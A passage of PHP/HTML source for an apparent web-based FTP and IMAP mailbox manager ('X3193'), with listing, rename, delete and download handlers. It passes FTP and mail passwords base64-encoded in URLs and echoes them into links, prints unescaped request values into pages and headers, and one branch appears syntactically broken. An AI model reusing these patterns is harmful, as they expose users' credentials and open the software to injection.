  eval('document.ftp.chidd'+i).checked = document.ftp.allitem.checked;
  i++;
 }
}
function delitem()
{
 if(!confirm('确定删除选中的文件吗?')) return;
 document.ftp.action='<?php echo httppath()."?api=ftp&skin=".$skincolor."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.remove")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>&delok=1';
 document.ftp.submit();
}

function rename(oldName)
{
toname=prompt('将文件 '+oldName+' 改名为:',oldName);
if(!toname)return;
window.location='<?php echo httppath()."?api=ftp&skin=".$skincolor."&server=".encodeuri(trim(request("server")))."&type=".encodeuri("file")."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&binary=".trim(request("binary"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.rename")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>&from='+encodeuri(oldName)+'&to='+encodeuri(toname);
}

function renamed(oldName)
{
toname=prompt('将目录 '+oldName+' 改名为:',oldName);
if(!toname)return;
window.location='<?php echo httppath()."?api=ftp&skin=".$skincolor."&server=".encodeuri(trim(request("server")))."&type=".encodeuri("dir")."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&binary=".trim(request("binary"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.rename")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>&from='+encodeuri(oldName)+'&to='+encodeuri(toname);
}

function encodeuri(str){
        var newstr;
        newstr = encodeURIComponent(str);
        newstr = newstr.replace(/\./g, "<?php echo encodeuri(".")?>", newstr);
        newstr = newstr.replace(/\-/g, "<?php echo encodeuri("-")?>", newstr);
        newstr = newstr.replace(/\_/g, "<?php echo encodeuri("_")?>", newstr);      
        // js replace 的模式无引号（双单），特殊字符需加斜杠，可以单独替换某个字符。
        return(newstr);
}
</script>       
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
<form name="imap" method="post" action="">
                <?php 
                $totalitem = $mail_count;
                if (fmod($totalitem, $pagesize) == 0){
                        $totalpage=$totalitem/$pagesize;
                }       
                else{
                        $totalpage=ceil($totalitem/$pagesize);
                }       
                if ($totalpage == $page)
                        $endid = 0;
                elseif ($totalpage > $page)
                        $endid = floor($mail_count-$strpagesize*($page));
                elseif ($totalpage < $page){
                        $endid = floor($mail_count-$strpagesize*($page-1));
                }       
                //echo $endid;          
                ?>
        <tr class="tdtbg">
                <td align="left">&nbsp;邮箱管理 -> <a href="<?php echo ScriptPath()."?api=imap&action=".encodeuri("mailbox.list")."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=&skin=".$skincolor."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")));?>" style="color:#444444;"><?php echo trim(request("servertype"))?>://<?php echo base64_decode(trim(request("uname"))).":".base64_decode(trim(request("pwd")))?>@<?php echo base64_decode(trim(request("server")));?></a> -> <?php echo trim(request("mailbox"))==""?"根目录":mb_convert_encoding(trim(request("mailbox")), "GB2312", "UTF7-IMAP");?></td>
        </tr>
</table>
                <?php 
                if ($mail_count > $pagesize) $strpagesize = $pagesize; else $strpagesize = $mail_count;
                ?>
<table width="95%" align="center" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdbg"> 
            <td valign="top"> 
                <table width="100%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
                <?php 
                ?>
                        <tr class="tdbg">
                                <td align="center" width="3%"><input type="checkbox" id="allitem" name="allitem" value="" onclick="javascript:selitemall();" /></td>
                                <td align="center">标题</td>
                                <td align="center" width="25%">发件人</td>
                                <td align="center" width="30%">搜索 创建 删除</td>
                        </tr>
                <?php 
                $i = 0;
                for($i=$mail_count-$strpagesize*($page-1);$i>$endid;$i--){
                        if ($debug == 1){
                                $mail_subject = array('0' => array('charset' => 'gb2312','text' => '东亚银行系统升级公告'));
                                $mailsubject = "";
                                for($j=0;$j<count($mail_subject);$j++){
                                        if($j!=count($mail_subject)-1){
                                                $mailsubject = (strtolower($mail_subject[$j]['charset'])!=='default'?iconv($mail_subject[$j]['charset'],"gb2312",$mail_subject[$j]['text']):$mail_subject[$j]['text'])." - ";
                                        }       
                                        else{
                                                $mailsubject = $mailsubject.(strtolower($mail_subject[$j]['charset'])!=='default'?iconv($mail_subject[$j]['charset'],"gb2312",$mail_subject[$j]['text']):$mail_subject[$j]['text']);
                                        }
                                }
                        }
                        else{
                                $list = imap_headerinfo($mbox,$i,1024,1024);//发件人字符长度，主题字符长度
                                $mail_subject = imap_mime_header_decode($list->fetchsubject);
                                //print_r($mail_subject);
                                //return;
                                $mailsubject = "";
                                for($j=0;$j<count($mail_subject);$j++){
                                        //echo $mail_subject[$j]->charset;
                                        $mailsubject = $mailsubject.((strtolower($mail_subject[$j]->charset)!='default'&&strtoupper($mail_subject[$j]->charset)!='EUC_CN')?iconv(strtolower($mail_subject[$j]->charset),"gb2312",$mail_subject[$j]->text):$mail_subject[$j]->text);
                                }       

                                $mail_from = imap_mime_header_decode($list->fetchfrom);
                                $mailfrom = "";
                                for($j=0;$j<count($mail_from);$j++){
                                        $mailfrom = $mailfrom.((strtolower($mail_from[$j]->charset)!=='default'&&strtoupper($mail_subject[$j]->charset)!='EUC_CN')?iconv(strtolower($mail_from[$j]->charset),"gb2312",$mail_from[$j]->text):$mail_from[$j]->text);
                                }                               
                        }                       
                        ?>
                        <tr class="tdbg">
                                <td align="center"><input type="checkbox" name="chidd<?php echo $cMaxDir;?>" id="chidd<?php echo $cMaxDir;?>" value="<?php echo $i;?>" /></td>
                                <td align="center"><?php echo "<a style='color:#444444' href='".ScriptPath()."?api=imap&action=".encodeuri("mail.list")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&mailnum=".$i."&mailbox=".encodeuri(trim(request("mailbox")))."'>".$mailsubject."</a>";?></td>
                                <td align="center"><?php echo $mailfrom;?></td>
                                <td align="center">搜索 添加 删除 配额 更名</td>
                        </tr>
                        <?php 
                }
                if ($debug == 1){
                }
                else{
                        imap_close($mbox);              
                }                       
                ?>
                </table>
            </td>
        </tr>           
</table>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdbg">
                <td align="center" colspan="3"> 共 <?php  echo $totalpage;?> 页 第  
                <?php 
                echo $page." 页 ".$sCrLf;
                if (floor($page)>1)
                        echo "<a style='color:#444444' href='".ScriptPath()."?api=imap&action=".encodeuri(trim(request("action")))."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&mailbox=".encodeuri(trim(request("mailbox")))."&pagesize=".$pagesize."&page=".($page-1)."&skin=".$skincolor."'>上一页</a> ";
                if (floor($page)>0 && floor($page)<floor($totalpage))
                        echo "<a style='color:#444444' href='".ScriptPath()."?api=imap&action=".encodeuri(trim(request("action")))."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&mailbox=".encodeuri(trim(request("mailbox")))."&pagesize=".$pagesize."&page=".($page+1)."&skin=".$skincolor."'>下一页</a> ";

                $gotopage = New PageChange();
                $gotopage->CallPageChange();
                ?>
                </td>
        </tr>   
</table>
<?php 
                $gotopage->gotopage($totalpage,ScriptPath()."?api=imap&action=".encodeuri(trim(request("action")))."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&mailbox=".encodeuri(trim(request("mailbox")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&gopage=ok&page=","X3193","请在空白处输入要转到的页数");
                break;
        case "robot.modify":
                break;
        case "robot.remove":
                break;
        case "robot.status":
                break;
        case "msg.create":
                break;
        case "msg.send":
                break;
        case "msg.qun.send":
                break;
        default:
                $style = new css();
?>
<script>
function changeimg()
{
 document.getElementById("ccimg").src = '<?php echo ScriptPath();?>?api=checkcode&a=' + Math.random();
}
</script>
<table width="95%" height="" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg" height="40">
                <td align="center">
                        <form action="<?php echo ScriptPath()?>?api=imap&skin=<?php echo $skincolor;?>&action=<?php echo encodeuri("mailbox.list");?>" method="post" name="imap">
                        &nbsp域名：<input type="text" class="text" name="server" value="" style="height:20px;width:12%;font-size:11px" <?php  $style->input("#FCFC9D","") ?>>  
                        &nbsp用户名：<input type="text" class="text" name="uname" value="" style="height:20px;width:12%;font-size:11px" <?php  $style->input("#FCFC9D","") ?>>  
                        &nbsp密码：<input type="password" class="text" name="pwd" value="" style="height:20px;width:12%;font-size:11px" <?php  $style->input("#FCFC9D","") ?>> 
                        &nbsp端口：<input type="port" class="text" name="port" value="143" style="height:20px;width:4%;font-size:11px" <?php  $style->input("#FCFC9D","") ?>> 
                        <SELECT name="servertype" size="1" <?php  $style->selectarea("#FCFC9D","");?> style="width:55px;height:16px;font-size:12px">
                                <OPTION VALUE="imap">IMAP</OPTION>
                                <OPTION VALUE="pop3">POP3</OPTION>
                                <OPTION VALUE="nntp">NNTP</OPTION>
                        </SELECT>
                        &nbsp验证码：<input <?php echo $style->input("#FCFC9D","") ?> maxlength="4" name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="看不清楚？换一个！"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath()?>?api=checkcode" border="0"></a>
                        &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
                </td>
        </tr>   
</table>
<?php 
                break;
}
$style->footer();               
}
?>

<?php 
function ftp(){
if (trim(request('action')) == "ftp.download"){
    Header("Content-type:application/octet-stream");
    header("Content-Disposition: attachment; filename=".trim(request("filename")));
        $ch = curl_init();
        $url = "ftp://".base64_decode(trim(request("uname"))).":".base64_decode(trim(request("pwd")))."@".base64_decode(trim(request("server"))).":".trim(request("port")).trim(request("dir"))."/".trim(request("filename"));
        //echo $url;
        //RETURN;
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_TIMEOUT, 50000);
        $xmlstr = curl_exec($ch);
        curl_close($ch); 
        echo $xmlstr; 
        return;
        exit;
}
header('Content-Type: text/html; charset=gb2312');
IF(is_wap()){
?>
<!DOCTYPE html 
     PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
     "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<?php 
}
?>

<head>
<?php 
$style = new css();
$style->ico();
$style->title("X3193 - FTP");
$skincolor = selstyle(trim(request("skin")));
$sCrLf = chr(13) . chr(10); // 回车 + 换行
?>

<table width="100%" height="100%" align="center" valign="center">
        <tr>
                <td align="center" valign="middle">
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
                <td align="left" style="border:0">
                <?php  selskin(); ?>
                </td>
                <td align="right" style="border:0">             
                        <?php  
                         IF(!is_wap())
                        	sellink("主页|插件|搜索|域名|FTP|读书|游戏|短片|股票|VPN",$skincolor);
                        else
                        	sellink("主页|搜索|域名|FTP|短片",$skincolor);
                        ?>
                </td>
        </tr>           
</table>
<table width="95%" height="3" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF">
        <tr>
                <td align="left">
                        
                </td>
        </tr>   
</table>
<?php 

// 每页条数
if (trim(request('pagesize')) == "")
        $pagesize = 30;
elseif (trim(request('pagesize')) > 50)
        $pagesize = 50;
else
        $pagesize = trim(request('pagesize'));


$stract = trim(request("action"));

if (trim(request("page")) != "" && is_numeric(trim(request("page"))) !== false){
        $page = floor(trim(request("page")));
}       
else{
        $page = floor("1");
}

$tag = New TagAction(); 
switch (trim(request('action'))) {  // case start
        case "ftp.getinfo":
                $tag->getinfo(scriptpath()."?api=ftp&skin=".$skincolor."&urlflag=1&action=".encodeuri("ftp.list")."&page=1&pagesize=".$pagesize,'link','780','500');
                break;
        case "ftp.list":
                if (trim(request("server")) == "" || trim(request("uname")) == "" || trim(request("pwd")) == ""){
                        if (trim($_POST["server"]) == "" || trim($_POST["uname"]) == "" || trim($_POST["pwd"]) == ""){
                                AlertBack("服务器名、用户名或密码为空！" , 1);
                                break;
                        }
                        else{
                                AlertBack("服务器名、用户名或密码为空！" , 2);
                                break;
                        }
                }
                If ($_SESSION['ValidCode'] != "" && trim(request("checkcode")) !="" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
                        if (trim(request("checkcode")) != ""){
                                AlertBack("四位验证码错误！" , 1);
                                break;
                        }       
                        elseif (trim(request("checkcode")) == ""){
                                AlertBack("四位验证码为空！" , 1);
                                break;
                        }               
                }
                if (trim(request("logout")) != ""){
                        session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                        session_register("ftp");
}                         

                        $_SESSION["ftp"]=array('server' => '', 'uname' => '', 'pwd' => '');                     
                        //session_register("server"); 
                        //$_SESSION["server"] = "";     
                        //session_register("uname"); 
                        //$_SESSION["uname"] = "";      
                        //session_register("pwd"); 
                        //$_SESSION["pwd"] = "";        
                        redirect(scriptpath()."?api=ftp&skin=".$skincolor."&server=&uname=&pwd=&action=".encodeuri(trim(request("action")))."&urlflag=1&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u"))));
                        break;
                }
                elseif (trim($_POST["server"]) != "" && trim($_POST["uname"]) != "" && trim($_POST["pwd"]) != ""){
                        session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                        session_register("ftp");
} 
                        $_SESSION["ftp"]=array('server' => trim(request("server")), 'uname' => trim(request("uname")), 'pwd' => trim(request("pwd")),'port' => trim(request("port")), 'ssl' => trim(request("ssl")), 'pasv' => trim(request("pasv")), 'binary' => trim(request("binary")), 'dir' => trim(request("dir")));                  
                        //session_register("server"); 
                        //$_SESSION["server"] = trim(request("server"));        
                        //session_register("uname"); 
                        //$_SESSION["uname"] = trim(request("uname"));  
                        //session_register("pwd"); 
                        //$_SESSION["pwd"] = trim(request("pwd"));      
                        redirect(scriptpath()."?api=ftp&skin=".$skincolor."&server=".encodeuri(base64_encode(trim($_POST["server"])))."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&binary=".trim(request("binary"))."&dir=".encodeuri("/")."&uname=".encodeuri(base64_encode(trim($_POST["uname"])))."&pwd=".encodeuri(base64_encode(trim($_POST["pwd"])))."&action=".encodeuri(trim(request("action")))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u"))));
                        break;
                }
                elseif ($_SESSION["ftp"]["server"] != "" && $_SESSION["ftp"]["uname"] != "" && $_SESSION["ftp"]["pwd"] != "" && trim(request("server")) == "" && trim(request("uname")) == "" && trim(request("pwd")) == ""){
                        redirect(scriptpath()."?api=ftp&skin=".$skincolor."&server=".encodeuri(base64_encode(trim($_SESSION["ftp"]["server"])))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&binary=".trim(request("binary"))."&port=".trim(request("port")).$skincolor."&dir=".encodeuri("/")."&uname=".encodeuri(base64_encode(trim($_SESSION["ftp"]["uname"])))."&pwd=".encodeuri(base64_encode(trim($_SESSION["ftp"]["pwd"])))."&action=".encodeuri(trim(request("action")))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u"))));
                        break;
                }       
                elseif (trim(request("server")) == "" || trim(request("uname")) == "" || trim(request("pwd")) == ""){
                        redirect(scriptpath()."?api=ftp&skin=".$skincolor."&server=&uname=&pwd=&action=&checkcode=".trim(request("checkcode"))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u"))));
                        break;
                }       
                $serverport = trim(request("port"))==""?"21":trim(request("port"));
                if (trim(request("ssl")) == "1"){
                        $conn_id = ftp_ssl_connect(base64_decode(trim(request("server"))),$serverport);
                }
                else{
                        $conn_id = ftp_connect(base64_decode(trim(request("server"))),$serverport);
                }       
                $login_result = ftp_login($conn_id, base64_decode(trim(request("uname"))), base64_decode(trim(request("pwd"))));                
                if ((!$conn_id) || (!$login_result)) {
                    AlertBack("FTP登陆失败！" , 2);
                }
                if (trim(request("pasv")) == "1"){
                        ftp_pasv ($conn_id, 1);
                }       
                $contents = ftp_rawlist($conn_id, trim(request("dir")));
                $systype = ftp_systype($conn_id); //"UNIX"; //
                ?>
<script language="JavaScript" type="text/javascript">
function selitemall()
{
 i=0;
 while(eval('document.ftp.chidd'+i))
 {
  eval('document.ftp.chidd'+i).checked = document.ftp.allitem.checked;
  i++;
 }
}
function delitem()
{
 if(!confirm('确定删除选中的文件吗?')) return;
 document.ftp.action='<?php echo httppath()."?api=ftp&skin=".$skincolor."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.remove")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>&delok=1';
 document.ftp.submit();
}

function rename(oldName)
{
toname=prompt('将文件 '+oldName+' 改名为:',oldName);
if(!toname)return;
window.location='<?php echo httppath()."?api=ftp&skin=".$skincolor."&server=".encodeuri(trim(request("server")))."&type=".encodeuri("file")."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&binary=".trim(request("binary"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.rename")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>&from='+encodeuri(oldName)+'&to='+encodeuri(toname);
}

function renamed(oldName)
{
toname=prompt('将目录 '+oldName+' 改名为:',oldName);
if(!toname)return;
window.location='<?php echo httppath()."?api=ftp&skin=".$skincolor."&server=".encodeuri(trim(request("server")))."&type=".encodeuri("dir")."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&binary=".trim(request("binary"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.rename")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>&from='+encodeuri(oldName)+'&to='+encodeuri(toname);
}

function encodeuri(str){
        var newstr;
        newstr = encodeURIComponent(str);
        newstr = newstr.replace(/\./g, "<?php echo encodeuri(".")?>", newstr);
        newstr = newstr.replace(/\-/g, "<?php echo encodeuri("-")?>", newstr);
        newstr = newstr.replace(/\_/g, "<?php echo encodeuri("_")?>", newstr);      
        // js replace 的模式无引号（双单），特殊字符需加斜杠，可以单独替换某个字符。
        return(newstr);
}
</script>       
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
<form name="ftp" method="post" action="">
        <tr class="tdtbg">
                <td align="center">FTP 空 间 管 理</td>
        </tr>
</table>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="left">&nbsp;FTP管理 -> <a href="<?php echo httppath()."?api=ftp&skin=".$skincolor."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&binary=".trim(request("binary"))."&dir=".encodeuri("/")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.list")."&dir=".encodeuri("/")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")));?>" style="color:#444444;">ftp://<?php echo base64_decode(trim(request("uname"))).":".base64_decode(trim(request("pwd")))?>@<?php echo base64_decode(trim(request("server")));?></a> -> <?php echo trim(request("dir"));?></td>
        </tr>
</table>
                <?php 
                if ($systype == "Windows_NT"){
                        //print_r($contents);
                        if (count($contents) > $pagesize) $strpagesize = $pagesize; else $strpagesize = count($contents);
                        ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdbg"> 
            <td valign="top"> 
                <table width="100%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
                        <?php 
                        ?>
                        <tr class="tdbg">
                                <td align="center" width="3%"><input type="checkbox" id="allitem" name="allitem" value="" onclick="javascript:selitemall();" /></td>
                                <td align="center" width="7%">类型</td>
                                <td align="center">名称</td>
                                <td align="center" width="15%">修改时间</td>
                                <td align="center" width="25%"><a href="<?php echo httppath()."?api=ftp"."&skin=".$skincolor."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.new")."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>" style="color:#444444">新建</a> <a href="<?php echo httppath()."?api=ftp"."&skin=".$skincolor."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.upload")."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>" style="color:#444444;">上传</a> <a style="color:#444444" href="javascript:delitem();">删除</a> 压缩 解压</td>
                        </tr>
                        <?php 
                        $cMaxDir = 0;
                        ?>
                        <?php 
                        foreach ($contents as $current){ 
                                ereg("([0-9]{2})-([0-9]{2})-([0-9]{2}) +([0-9]{2}):([0-9]{2})(AM|PM) +([0-9]+|<DIR>) +(.+)",$current,$split);
                                if ($split[7]=="<DIR>"){
                        ?>
                        <tr class="tdbg">
                                <td align="center"><input type="checkbox" name="chidd<?php echo $cMaxDir;?>" id="chidd<?php echo $cMaxDir;?>" value="<?php echo $split[8];?>" /></td>
                                <td align="center">目录</td>
                                <?php 
                                if ($split[8] == "."){
                                ?>
                                        <td align="left">&nbsp;<a href="<?php echo httppath()."?api=ftp&skin=".$skincolor."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&server=".trim(request("server"))."&dir=".encodeuri("/")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri(trim(request("action")))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")));?>" style="color:#444444"><?php echo ".";?></a></td>

                                }
                                elseif ($split[8] == ".."){
                                ?>
                                        <td align="left">&nbsp;<a href="<?php echo httppath()."?api=ftp&skin=".$skincolor."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&server=".trim(request("server"))."&dir=".encodeuri(substr(trim(request("dir")),0,strripos(trim(request("dir")), "/"))==""?"/":substr(trim(request("dir")),0,strripos(trim(request("dir")), "/")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri(trim(request("action")))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")));?>" style="color:#444444"><?php echo "..";?></a></td>
                                <?php       
                                }
                                else{
                                ?>
                                        <td align="left">&nbsp;<a href="<?php echo httppath()."?api=ftp&skin=".$skincolor."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir"))=="/"?trim(request("dir")).$split[8]:trim(request("dir"))."/".$split[8])."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri(trim(request("action")))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")));?>" style="color:#444444"><?php echo $split[8];?></a></td>
                                <?php 
                                }
                                ?>
                                <td align="center"><?php echo $split[1]."-".$split[2]."-".$split[3]." ".$split[4].":".$split[5].$split[6];?></td>
                                <td align="center"><a href="javascript:renamed('<?php echo $split[8];?>');" style="color:#444444">改名</a> <a href="<?php echo httppath()."?api=ftp&skin=".$skincolor."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir")))."&dirname=".encodeuri($split[8])."&type=".encodeuri("dir")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.remove")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>" style="color:#444444">删除</a> <a href="<?php echo httppath()."?api=ftp&skin=".$skincolor."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir")))."&dirname=".encodeuri($split[8])."&type=".encodeuri("dir")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.view")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>" style="color:#444444">列表</a> 压缩</td>
                        </tr>
                        <?php 
                                        $cMaxDir = $cMaxDir + 1;
                                }
                                unset($current);
                                unset($split);
                        }
                        $cMaxFile = $cMaxDir;
                        foreach ($contents as $current){ 
                                ereg("([0-9]{2})-([0-9]{2})-([0-9]{2}) +([0-9]{2}):([0-9]{2})(AM|PM) +([0-9]+|<DIR>) +(.+)",$current,$split);
                                if ($split[7]!="<DIR>"){
                        ?>
                        <tr class="tdbg">
                                <td align="center"><input type="checkbox" name="chidd<?php echo $cMaxFile;?>" id="chidd<?php echo $cMaxFile;?>" value="<?php echo $split[8];?>"></td>
                                <td align="center">文件</td>
                                <td align="left">&nbsp;<a href="<?php echo httppath()."?api=ftp&skin=".$skincolor."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir")))."&filename=".encodeuri($split[8])."&type=".encodeuri("file")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.download")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>" style="color:#444444"><?php echo $split[8];?></a></td>
                                <td align="center"><?php echo $split[1]."-".$split[2]."-".$split[3]." ".$split[4].":".$split[5].$split[6];?></td>
